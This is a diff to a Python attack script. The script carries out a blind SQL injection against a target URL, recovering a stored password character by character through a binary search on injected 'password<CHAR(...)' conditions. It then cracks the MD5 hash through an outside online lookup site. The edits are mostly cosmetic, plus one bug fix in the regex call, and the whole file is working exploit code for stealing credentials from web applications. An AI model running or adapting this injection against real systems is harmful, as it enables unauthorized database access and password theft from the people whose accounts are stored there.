@@ -29,7 +29,7 @@ def blind_injection(target_url, authorized_characters, string_when_success, leng
     The function will return the found password.
     '''
 
-    sys.stdout.write('Processing password... ')
+    sys.stdout.write('Retrieving password... ')
     sys.stdout.flush()
     password = ''
     ascii_password = ''
@@ -38,17 +38,17 @@ def blind_injection(target_url, authorized_characters, string_when_success, leng
     while (len(password) < length):
 
 	# Parameters for the binary search
-	a, b = 0, len(authorized_characters)-1
+	a, b = 0, len(authorized_characters) - 1
 	# old_c is used, cause we can't performan usual
 	# binary search (we can't test the equality)
 	c, old_c = 0, 0
 
 	while (a < b):
 	    old_c = c
-	    c = (a+b)/2
+	    c = (a + b)/2
 
 	    if (c == old_c):
-		c +=1
+		c += 1
 
 	    tested_character = authorized_characters[c]
 
@@ -66,7 +66,8 @@ def blind_injection(target_url, authorized_characters, string_when_success, leng
 		separator = '&'
 	    else:
 		separator = '?'
-	    url = target_url + (separator + 'id=0||password<CHAR(%s%s)' % (ascii_password, str(ord(tested_character))))
+	    url = target_url + separator + 'id=0||password<CHAR({0}{1})'
+	    url = url.format(ascii_password, ord(tested_character))
 	    curl_object.setopt(pycurl.URL, url)
 	    #### END OF CHANGE
 
@@ -77,7 +78,7 @@ def blind_injection(target_url, authorized_characters, string_when_success, leng
 	    # We seek which half of authorized_characters
 	    # we should search in
 	    if string_when_success in output.getvalue():
-		b = c-1
+		b = c - 1
 	    else:
 		a = c
 
@@ -97,28 +98,23 @@ def reverse_hash(hash_to_reverse):
     '''
     This function is used to reverse a MD5 hash.
     It uses an online tool: http://tools.benramsey.com/md5/md5.php
-    It then parses the result page to find the clear password.
+    It then parses the result page to find the plain password.
     '''
-
-    sys.stdout.write('Reversing the hash... ')
-    sys.stdout.flush()
 
     # We define a Curl object to retrieve the clear password
     output = StringIO.StringIO()
     curl_object = pycurl.Curl()
     curl_object.setopt(pycurl.WRITEFUNCTION, output.write)
-    curl_object.setopt(pycurl.URL, 'http://tools.benramsey.com/md5/md5.php?hash=' + hash_to_reverse)
+    curl_object.setopt(pycurl.URL,
+	    'http://tools.benramsey.com/md5/md5.php?hash=' + hash_to_reverse)
     curl_object.perform()
 
     # We retrieve the result page
     page_result = output.getvalue()
 
     # We parse it to find the clear password
-    match = re.search(r'<string><!\[CDATA\[(.*)\]\]></string>')
-    clear_password = match.group(1)
+    match = re.search(r'<string><!\[CDATA\[(.*)\]\]></string>', page_result)
+    plain_password = match.group(1)
 
-    # We display it on stdout, and we return it
-    sys.stdout.write(clear_password + '\n')
-
-    return clear_password
+    return plain_password
 
